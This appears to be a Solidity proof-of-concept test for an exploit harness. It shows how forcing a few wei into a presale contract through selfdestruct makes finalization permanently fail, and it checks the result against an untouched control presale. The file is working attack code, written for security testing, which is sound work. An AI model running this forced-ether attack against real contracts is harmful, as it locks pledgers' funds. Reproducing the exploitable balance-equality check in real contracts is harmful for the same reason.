// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {AssayPoC} from "assay/AssayExploit.sol";
import {Presale} from "../src/Presale.sol";

/// @notice Sends its ether to `target` when it is created, whether or not `target` accepts ether.
contract ForcedSender {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}

/// @notice Denial of service through forced ether: `finalize` requires the balance to equal the
///         pledges, and ether can be forced into any contract, so a few wei stop the presale from
///         ever being finalized. Pledges above the target cannot be withdrawn.
/// Knob:
///   0 `forced_wei`  the ether that the attacker forces into the presale, in wei.
/// Two presales get the same pledges. The attacker forces ether into one of them. A keeper then
/// tries to finalize both. The presale that was not touched is the control: the attack worked if
/// the control can be finalized and the other one cannot.
contract PresaleForcedEtherPoC is AssayPoC {
    Presale internal attacked;
    Presale internal control;

    function setUpTarget() internal override {
        address beneficiary = makeAddr("beneficiary");
        attacked = new Presale(beneficiary, 10 ether);
        control = new Presale(beneficiary, 10 ether);
        string[2] memory names = ["alice", "bob"];
        for (uint256 i = 0; i < names.length; i++) {
            address pledger = makeAddr(names[i]);
            vm.deal(pledger, 20 ether);
            vm.startPrank(pledger);
            attacked.pledge{value: (i + 1) * 3 ether}();
            control.pledge{value: (i + 1) * 3 ether}();
            vm.stopPrank();
        }
        address carol = makeAddr("carol");
        vm.deal(carol, 8 ether);
        vm.startPrank(carol);
        attacked.pledge{value: 4 ether}();
        control.pledge{value: 4 ether}();
        vm.stopPrank();

        declareAttackerBalance(1_000, 1_000, 1 ether);
        declareKnob(0, "forced_wei", 1, 1, 1_000);
    }

    function exploit() internal override {
        vm.prank(attacker);
        new ForcedSender{value: knob(0)}(payable(address(attacked)));

        address keeper = makeAddr("keeper");
        vm.startPrank(keeper);
        (bool controlFinalizes,) = address(control).call(abi.encodeCall(Presale.finalize, ()));
        (bool attackedFinalizes,) = address(attacked).call(abi.encodeCall(Presale.finalize, ()));
        vm.stopPrank();

        invariant_broken("finalize_possible", !(controlFinalizes && !attackedFinalizes));
    }
}
